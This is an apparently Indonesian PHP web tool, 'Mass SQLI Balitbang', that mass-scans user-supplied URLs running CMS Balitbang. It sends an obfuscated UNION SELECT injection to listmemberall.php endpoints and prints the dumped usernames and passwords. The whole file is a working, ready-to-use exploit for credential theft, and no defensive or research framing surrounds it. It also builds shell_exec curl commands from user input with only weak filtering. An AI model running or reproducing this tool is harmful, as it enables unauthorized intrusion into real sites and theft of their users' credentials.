<html>
<head>
<title>[+] Mass SQLI Balitbang [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
</head>
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
<body bgcolor="#1e1e1e" text="white" style="max-width: 100%">
<style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');


textarea {
max-width: 90%;
width: 90%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

textarea#note {
  width:100%;
    resize: none;
  display:block;
  max-width:100%;
  border: none;
    outline: none;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
  max-width: 95%;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: ##1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: ##1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}

.area {
  font-family: Courier;
}

nemu {
  color: green;
}

kgk {
  color: red;
}
</style>
<body>
<center>
<font face=courier new size=5>Mass SQLI Balitbang<br><font size="3">Auto Get Username dan Password CMS Balitbang</font><font size="3"><hr>
<form method="post">
<textarea rows=1 name="url" placeholder="https://exploits.my.id/ (only url)" required="true"></textarea><br><br>
<input type="submit" name="go" value="Gaskan">
</form>
<?php
@set_time_limit(0);
if (isset($_POST['url'])) {
  $url = explode("\r\n", $_POST['url']);
}
if (isset($_POST['go'])) {
  $go = $_POST['go'];
}
if (isset($go)) {
  echo "<hr><pre style='text-align: left; white-space: pre-line;'>";
  $ex = array("/member/listmemberall.php","/users/listmemberall.php","/user/listmemberall.php");
  $dios = "(select+group_concat('<result>',username,0x3a,password,'</result>')+from+user)";
  ob_implicit_flush(true);ob_end_flush();
  foreach ($url as $web) {
    foreach ($ex as $wl) {
      $cari = $web."".$wl;
      $cari = str_replace('"', '', $cari);
      $cari = str_replace('&', '', $cari);
      $cari = str_replace('|', '', $cari);
      $cari = str_replace('$', '', $cari);
      $cari = str_replace("///", "/", $cari);
      $cari = str_replace("//", "/", $cari);
      $cari = str_replace("https:/", "https://", $cari);
      $cari = str_replace("http:/", "http://", $cari);
      $cek = shell_exec('curl -Ls -o /dev/null -I -w "%{http_code}" "'.$cari.'"');
      if ($cek == "200") {
      $ekse = shell_exec("curl -Lsk --ipv4 '".$cari."'");
      if (empty($ekse)) {
        $c = curl_init();
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_URL, $cari);
        curl_setopt($c, CURLOPT_POSTFIELDS, "queryString=exploit'/**//*!12345uNIoN*//**//*!12345sELEcT*//**/$dios,version()-- -");
        curl_setopt($c, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($c, CURLOPT_VERBOSE, false);
        $str = curl_exec($c);
        $preg = preg_match_all("'<result>(.*?)</result>'si", $str, $isi);
        if(!empty($isi[1])) {
          echo "[<nemu>Vuln</nemu>] ".$cari;
          $i=1;
          foreach($isi[1] as $get) {
          $ubah = "[-] Username : ".str_replace(":", "\n[-] Password : ", $get);
          echo "\n\n[+] Data ".$i++."";
          echo "\n$ubah";
        }
        echo "\n\n";
      } else {
        echo "[<kgk>Not Vuln</kgk>] ".$cari."\n";
      }
      } else {
        echo "[<kgk>Not Vuln</kgk>] ".$cari."\n";
      }
    } else {
        echo "[<kgk>Not Vuln</kgk>] ".$cari."\n";
      }
  }
}
}
echo "</pre>";
?>
</font>
<center><hr><font size=3>Unknown45 - 2021
</body>
</html>